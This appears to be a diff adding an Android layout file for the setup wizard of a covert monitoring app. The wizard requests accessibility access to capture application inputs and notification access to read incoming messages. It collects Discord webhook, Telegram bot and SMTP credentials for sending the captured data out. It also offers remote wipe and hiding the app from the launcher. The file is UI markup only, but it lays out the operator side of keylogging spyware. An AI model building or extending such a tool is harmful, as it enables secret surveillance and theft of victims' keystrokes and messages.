@@ -1,0 +1,272 @@
+<?xml version="1.0" encoding="utf-8"?>
+<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
+    xmlns:app="http://schemas.android.com/apk/res-auto"
+    android:layout_width="match_parent"
+    android:layout_height="match_parent"
+    android:background="@color/bg_dark"
+    android:orientation="vertical">
+
+    <!-- Header -->
+    <LinearLayout
+        android:layout_width="match_parent"
+        android:layout_height="wrap_content"
+        android:gravity="center"
+        android:orientation="vertical"
+        android:paddingTop="40dp"
+        android:paddingBottom="24dp">
+        <TextView
+            android:layout_width="wrap_content"
+            android:layout_height="wrap_content"
+            android:text="System Setup"
+            android:textColor="@color/text_main"
+            android:textSize="22sp"
+            android:textStyle="bold"
+            android:letterSpacing="-0.02"/>
+        <TextView
+            android:id="@+id/serviceStatus"
+            android:layout_width="wrap_content"
+            android:layout_height="wrap_content"
+            android:layout_marginTop="6dp"
+            android:text="Not Configured"
+            android:textColor="@color/text_dim"
+            android:textSize="13sp" />
+    </LinearLayout>
+
+    <!-- Progress Tracker -->
+    <LinearLayout
+        android:id="@+id/progressDots"
+        android:layout_width="match_parent"
+        android:layout_height="wrap_content"
+        android:gravity="center"
+        android:orientation="horizontal"
+        android:layout_marginBottom="24dp">
+        <View android:id="@+id/dot1" android:layout_width="32dp" android:layout_height="4dp" android:background="@color/primary" android:layout_margin="4dp"/>
+        <View android:id="@+id/dot2" android:layout_width="32dp" android:layout_height="4dp" android:background="#1AFFFFFF" android:layout_margin="4dp"/>
+        <View android:id="@+id/dot3" android:layout_width="32dp" android:layout_height="4dp" android:background="#1AFFFFFF" android:layout_margin="4dp"/>
+    </LinearLayout>
+
+    <ViewFlipper
+        android:id="@+id/viewFlipper"
+        android:layout_width="match_parent"
+        android:layout_height="0dp"
+        android:layout_weight="1"
+        android:inAnimation="@android:anim/slide_in_left"
+        android:outAnimation="@android:anim/slide_out_right">
+
+        <!-- STEP 1: PERMISSIONS -->
+        <ScrollView
+            android:layout_width="match_parent"
+            android:layout_height="match_parent"
+            android:fillViewport="true">
+            <LinearLayout
+                android:layout_width="match_parent"
+                android:layout_height="wrap_content"
+                android:padding="24dp"
+                android:orientation="vertical">
+                
+                <TextView
+                    android:layout_width="wrap_content"
+                    android:layout_height="wrap_content"
+                    android:text="Required Permissions"
+                    android:textColor="@color/text_main"
+                    android:textSize="16sp"
+                    android:textStyle="bold"
+                    android:layout_marginBottom="24dp"/>
+
+                <!-- Accessibility -->
+                <LinearLayout
+                    android:id="@+id/permAccessibility"
+                    android:layout_width="match_parent"
+                    android:layout_height="wrap_content"
+                    android:background="@drawable/card_bg"
+                    android:orientation="vertical"
+                    android:padding="20dp"
+                    android:layout_marginBottom="16dp"
+                    android:clickable="true"
+                    android:focusable="true">
+                    <LinearLayout android:layout_width="match_parent" android:layout_height="wrap_content" android:orientation="horizontal" android:gravity="center_vertical">
+                        <TextView android:layout_width="0dp" android:layout_height="wrap_content" android:layout_weight="1" android:text="Accessibility Service" android:textColor="@color/text_main" android:textSize="15sp" android:textStyle="bold" />
+                        <TextView android:id="@+id/statusAccessibility" android:layout_width="wrap_content" android:layout_height="wrap_content" android:text="Off" android:textColor="@color/text_dim" android:textSize="13sp" android:textStyle="bold" />
+                    </LinearLayout>
+                    <TextView android:layout_width="wrap_content" android:layout_height="wrap_content" android:layout_marginTop="8dp" android:text="Required for capturing application inputs." android:textColor="@color/text_dim" android:textSize="13sp" />
+                </LinearLayout>
+
+                <!-- Notification -->
+                <LinearLayout
+                    android:id="@+id/permNotification"
+                    android:layout_width="match_parent"
+                    android:layout_height="wrap_content"
+                    android:background="@drawable/card_bg"
+                    android:orientation="vertical"
+                    android:padding="20dp"
+                    android:layout_marginBottom="16dp"
+                    android:clickable="true"
+                    android:focusable="true">
+                    <LinearLayout android:layout_width="match_parent" android:layout_height="wrap_content" android:orientation="horizontal" android:gravity="center_vertical">
+                        <TextView android:layout_width="0dp" android:layout_height="wrap_content" android:layout_weight="1" android:text="Notification Access" android:textColor="@color/text_main" android:textSize="15sp" android:textStyle="bold" />
+                        <TextView android:id="@+id/statusNotification" android:layout_width="wrap_content" android:layout_height="wrap_content" android:text="Off" android:textColor="@color/text_dim" android:textSize="13sp" android:textStyle="bold" />
+                    </LinearLayout>
+                    <TextView android:layout_width="wrap_content" android:layout_height="wrap_content" android:layout_marginTop="8dp" android:text="Required to read incoming messages." android:textColor="@color/text_dim" android:textSize="13sp" />
+                </LinearLayout>
+
+                <!-- Battery -->
+                <LinearLayout
+                    android:id="@+id/permBattery"
+                    android:layout_width="match_parent"
+                    android:layout_height="wrap_content"
+                    android:background="@drawable/card_bg"
+                    android:orientation="vertical"
+                    android:padding="20dp"
+                    android:layout_marginBottom="16dp"
+                    android:clickable="true"
+                    android:focusable="true">
+                    <LinearLayout android:layout_width="match_parent" android:layout_height="wrap_content" android:orientation="horizontal" android:gravity="center_vertical">
+                        <TextView android:layout_width="0dp" android:layout_height="wrap_content" android:layout_weight="1" android:text="Battery Optimization" android:textColor="@color/text_main" android:textSize="15sp" android:textStyle="bold" />
+                        <TextView android:id="@+id/statusBattery" android:layout_width="wrap_content" android:layout_height="wrap_content" android:text="Optimized" android:textColor="@color/text_dim" android:textSize="13sp" android:textStyle="bold" />
+                    </LinearLayout>
+                    <TextView android:layout_width="wrap_content" android:layout_height="wrap_content" android:layout_marginTop="8dp" android:text="Ensure background operations are not restricted." android:textColor="@color/text_dim" android:textSize="13sp" />
+                </LinearLayout>
+                <!-- Internal Throttling Toggle -->
+                <LinearLayout
+                    android:layout_width="match_parent"
+                    android:layout_height="wrap_content"
+                    android:background="@drawable/card_bg"
+                    android:padding="20dp"
+                    android:layout_marginBottom="16dp">
+                    <com.google.android.material.switchmaterial.SwitchMaterial
+                        android:id="@+id/switchBatteryOpt"
+                        android:layout_width="match_parent"
+                        android:layout_height="wrap_content"
+                        android:text="Enable Internal Throttling"
+                        android:textColor="@color/text_main"
+                        android:textSize="14sp"
+                        android:checked="true"
+                        app:thumbTint="@color/primary" />
+                </LinearLayout>
+            </LinearLayout>
+        </ScrollView>
+
+        <!-- STEP 2: CONNECTIONS -->
+        <ScrollView
+            android:layout_width="match_parent"
+            android:layout_height="match_parent"
+            android:fillViewport="true">
+            <LinearLayout
+                android:layout_width="match_parent"
+                android:layout_height="wrap_content"
+                android:padding="24dp"
+                android:orientation="vertical">
+                
+                <TextView
+                    android:layout_width="wrap_content"
+                    android:layout_height="wrap_content"
+                    android:text="External Connections"
+                    android:textColor="@color/text_main"
+                    android:textSize="16sp"
+                    android:textStyle="bold"
+                    android:layout_marginBottom="24dp"/>
+
+                <com.google.android.material.textfield.TextInputLayout android:layout_width="match_parent" android:layout_height="wrap_content" android:layout_marginBottom="12dp" app:boxBackgroundMode="outline" app:boxStrokeColor="@color/card_border" app:hintTextColor="@color/text_dim" app:boxCornerRadiusTopStart="12dp" app:boxCornerRadiusTopEnd="12dp" app:boxCornerRadiusBottomStart="12dp" app:boxCornerRadiusBottomEnd="12dp">
+                    <com.google.android.material.textfield.TextInputEditText android:id="@+id/inputWebhookUrl" android:layout_width="match_parent" android:layout_height="wrap_content" android:hint="Discord Webhook URL" android:inputType="textUri" android:textColor="@color/text_main" android:textColorHint="@color/text_dim" android:textSize="14sp" />
+                </com.google.android.material.textfield.TextInputLayout>
+                <com.google.android.material.button.MaterialButton android:id="@+id/btnTestDiscord" android:layout_width="match_parent" android:layout_height="48dp" android:text="Test Discord Connection" android:textAllCaps="false" android:textSize="13sp" style="@style/Widget.MaterialComponents.Button.OutlinedButton" app:strokeColor="@color/primary" android:textColor="@color/primary" app:cornerRadius="12dp" android:layout_marginBottom="32dp" />
+
+                <com.google.android.material.textfield.TextInputLayout android:layout_width="match_parent" android:layout_height="wrap_content" android:layout_marginBottom="12dp" app:boxBackgroundMode="outline" app:boxStrokeColor="@color/card_border" app:hintTextColor="@color/text_dim" app:boxCornerRadiusTopStart="12dp" app:boxCornerRadiusTopEnd="12dp" app:boxCornerRadiusBottomStart="12dp" app:boxCornerRadiusBottomEnd="12dp">
+                    <com.google.android.material.textfield.TextInputEditText android:id="@+id/inputTelegramToken" android:layout_width="match_parent" android:layout_height="wrap_content" android:hint="Telegram Bot Token" android:inputType="text" android:textColor="@color/text_main" android:textColorHint="@color/text_dim" android:textSize="14sp" />
+                </com.google.android.material.textfield.TextInputLayout>
+                <com.google.android.material.textfield.TextInputLayout android:layout_width="match_parent" android:layout_height="wrap_content" android:layout_marginBottom="12dp" app:boxBackgroundMode="outline" app:boxStrokeColor="@color/card_border" app:hintTextColor="@color/text_dim" app:boxCornerRadiusTopStart="12dp" app:boxCornerRadiusTopEnd="12dp" app:boxCornerRadiusBottomStart="12dp" app:boxCornerRadiusBottomEnd="12dp">
+                    <com.google.android.material.textfield.TextInputEditText android:id="@+id/inputTelegramChatId" android:layout_width="match_parent" android:layout_height="wrap_content" android:hint="Telegram Chat ID" android:inputType="text" android:textColor="@color/text_main" android:textColorHint="@color/text_dim" android:textSize="14sp" />
+                </com.google.android.material.textfield.TextInputLayout>
+                <com.google.android.material.button.MaterialButton android:id="@+id/btnTestTelegram" android:layout_width="match_parent" android:layout_height="48dp" android:text="Test Telegram Connection" android:textAllCaps="false" android:textSize="13sp" style="@style/Widget.MaterialComponents.Button.OutlinedButton" app:strokeColor="@color/primary" android:textColor="@color/primary" app:cornerRadius="12dp" android:layout_marginBottom="32dp" />
+
+                <!-- Reduced emphasis on SMTP for cleaner UI, but kept functional -->
+                <com.google.android.material.textfield.TextInputLayout android:layout_width="match_parent" android:layout_height="wrap_content" android:layout_marginBottom="12dp" app:boxBackgroundMode="outline" app:boxStrokeColor="@color/card_border" app:hintTextColor="@color/text_dim" app:boxCornerRadiusTopStart="12dp" app:boxCornerRadiusTopEnd="12dp" app:boxCornerRadiusBottomStart="12dp" app:boxCornerRadiusBottomEnd="12dp">
+                    <com.google.android.material.textfield.TextInputEditText android:id="@+id/inputSmtpHost" android:layout_width="match_parent" android:layout_height="wrap_content" android:hint="SMTP Host" android:inputType="text" android:textColor="@color/text_main" android:textColorHint="@color/text_dim" android:textSize="14sp" />
+                </com.google.android.material.textfield.TextInputLayout>
+                <com.google.android.material.textfield.TextInputLayout android:layout_width="match_parent" android:layout_height="wrap_content" android:layout_marginBottom="12dp" app:boxBackgroundMode="outline" app:boxStrokeColor="@color/card_border" app:hintTextColor="@color/text_dim" app:boxCornerRadiusTopStart="12dp" app:boxCornerRadiusTopEnd="12dp" app:boxCornerRadiusBottomStart="12dp" app:boxCornerRadiusBottomEnd="12dp">
+                    <com.google.android.material.textfield.TextInputEditText android:id="@+id/inputSmtpPort" android:layout_width="match_parent" android:layout_height="wrap_content" android:hint="SMTP Port" android:inputType="number" android:text="587" android:textColor="@color/text_main" android:textColorHint="@color/text_dim" android:textSize="14sp" />
+                </com.google.android.material.textfield.TextInputLayout>
+                <com.google.android.material.textfield.TextInputLayout android:layout_width="match_parent" android:layout_height="wrap_content" android:layout_marginBottom="12dp" app:boxBackgroundMode="outline" app:boxStrokeColor="@color/card_border" app:hintTextColor="@color/text_dim" app:boxCornerRadiusTopStart="12dp" app:boxCornerRadiusTopEnd="12dp" app:boxCornerRadiusBottomStart="12dp" app:boxCornerRadiusBottomEnd="12dp">
+                    <com.google.android.material.textfield.TextInputEditText android:id="@+id/inputSmtpUser" android:layout_width="match_parent" android:layout_height="wrap_content" android:hint="SMTP Username" android:inputType="textEmailAddress" android:textColor="@color/text_main" android:textColorHint="@color/text_dim" android:textSize="14sp" />
+                </com.google.android.material.textfield.TextInputLayout>
+                <com.google.android.material.textfield.TextInputLayout android:layout_width="match_parent" android:layout_height="wrap_content" android:layout_marginBottom="12dp" app:boxBackgroundMode="outline" app:boxStrokeColor="@color/card_border" app:hintTextColor="@color/text_dim" app:endIconMode="password_toggle" app:boxCornerRadiusTopStart="12dp" app:boxCornerRadiusTopEnd="12dp" app:boxCornerRadiusBottomStart="12dp" app:boxCornerRadiusBottomEnd="12dp">
+                    <com.google.android.material.textfield.TextInputEditText android:id="@+id/inputSmtpPass" android:layout_width="match_parent" android:layout_height="wrap_content" android:hint="SMTP Password" android:inputType="textPassword" android:textColor="@color/text_main" android:textColorHint="@color/text_dim" android:textSize="14sp" />
+                </com.google.android.material.textfield.TextInputLayout>
+
+                <com.google.android.material.textfield.TextInputLayout android:layout_width="match_parent" android:layout_height="wrap_content" android:layout_marginBottom="24dp" app:boxBackgroundMode="outline" app:boxStrokeColor="@color/card_border" app:hintTextColor="@color/text_dim" app:boxCornerRadiusTopStart="12dp" app:boxCornerRadiusTopEnd="12dp" app:boxCornerRadiusBottomStart="12dp" app:boxCornerRadiusBottomEnd="12dp">
+                    <com.google.android.material.textfield.TextInputEditText android:id="@+id/inputSmtpTo" android:layout_width="match_parent" android:layout_height="wrap_content" android:hint="Recipient Email" android:inputType="textEmailAddress" android:textColor="@color/text_main" android:textColorHint="@color/text_dim" android:textSize="14sp" />
+                </com.google.android.material.textfield.TextInputLayout>
+
+            </LinearLayout>
+        </ScrollView>
+
+        <!-- STEP 3: PREFERENCES & DEPLOY -->
+        <ScrollView
+            android:layout_width="match_parent"
+            android:layout_height="match_parent"
+            android:fillViewport="true">
+            <LinearLayout
+                android:layout_width="match_parent"
+                android:layout_height="wrap_content"
+                android:padding="24dp"
+                android:orientation="vertical">
+                
+                <TextView
+                    android:layout_width="wrap_content"
+                    android:layout_height="wrap_content"
+                    android:text="System Preferences"
+                    android:textColor="@color/text_main"
+                    android:textSize="16sp"
+                    android:textStyle="bold"
+                    android:layout_marginBottom="24dp"/>
+
+                <com.google.android.material.textfield.TextInputLayout android:layout_width="match_parent" android:layout_height="wrap_content" android:layout_marginBottom="24dp" app:boxBackgroundMode="outline" app:boxStrokeColor="@color/card_border" app:hintTextColor="@color/text_dim" app:endIconMode="password_toggle" app:boxCornerRadiusTopStart="12dp" app:boxCornerRadiusTopEnd="12dp" app:boxCornerRadiusBottomStart="12dp" app:boxCornerRadiusBottomEnd="12dp">
+                    <com.google.android.material.textfield.TextInputEditText android:id="@+id/inputEncryptionPassword" android:layout_width="match_parent" android:layout_height="wrap_content" android:hint="Encryption Password (Required)" android:inputType="textPassword" android:textColor="@color/text_main" android:textColorHint="@color/text_dim" android:textSize="14sp" />
+                </com.google.android.material.textfield.TextInputLayout>
+
+                <LinearLayout android:layout_width="match_parent" android:layout_height="wrap_content" android:background="@drawable/card_bg" android:padding="20dp" android:layout_marginBottom="12dp">
+                    <com.google.android.material.switchmaterial.SwitchMaterial android:id="@+id/switchKillSwitch" android:layout_width="match_parent" android:layout_height="wrap_content" android:text="Enable Remote Wipe" android:textColor="@color/text_main" android:textSize="14sp" app:thumbTint="@color/primary" />
+                </LinearLayout>
+
+                <LinearLayout android:layout_width="match_parent" android:layout_height="wrap_content" android:background="@drawable/card_bg" android:padding="20dp" android:layout_marginBottom="12dp">
+                    <com.google.android.material.switchmaterial.SwitchMaterial android:id="@+id/switchLocalLog" android:layout_width="match_parent" android:layout_height="wrap_content" android:text="Enable Offline Storage" android:textColor="@color/text_main" android:textSize="14sp" android:checked="true" app:thumbTint="@color/primary" />
+                </LinearLayout>
+
+                <LinearLayout android:layout_width="match_parent" android:layout_height="wrap_content" android:background="@drawable/card_bg" android:padding="20dp" android:layout_marginBottom="24dp">
+                    <com.google.android.material.switchmaterial.SwitchMaterial android:id="@+id/switchHideApp" android:layout_width="match_parent" android:layout_height="wrap_content" android:text="Hide App from Launcher" android:textColor="@color/text_main" android:textSize="14sp" android:checked="true" app:thumbTint="@color/primary" />
+                </LinearLayout>
+
+            </LinearLayout>
+        </ScrollView>
+    </ViewFlipper>
+
+    <!-- Navigation Footer -->
+    <LinearLayout
+        android:layout_width="match_parent"
+        android:layout_height="wrap_content"
+        android:orientation="horizontal"
+        android:padding="24dp"
+        android:background="@color/bg_dark">
+        <com.google.android.material.button.MaterialButton
+            android:id="@+id/btnPrev"
+            android:layout_width="0dp"
+            android:layout_weight="1"
+            android:layout_height="56dp"
+            android:text="Back"
+            android:textAllCaps="false"
+            style="@style/Widget.MaterialComponents.Button.TextButton"
+            android:textColor="@color/text_dim"
+            android:visibility="invisible"/>
+        <com.google.android.material.button.MaterialButton
+            android:id="@+id/btnNext"
+            android:layout_width="0dp"
+            android:layout_weight="1.5"
+            android:layout_height="56dp"
+            android:text="Continue"
+            android:textAllCaps="false"
+            android:textSize="16sp"
+            app:backgroundTint="@color/primary"
+            android:textColor="#FFFFFF"
+            app:cornerRadius="12dp"/>
+    </LinearLayout>
+</LinearLayout>
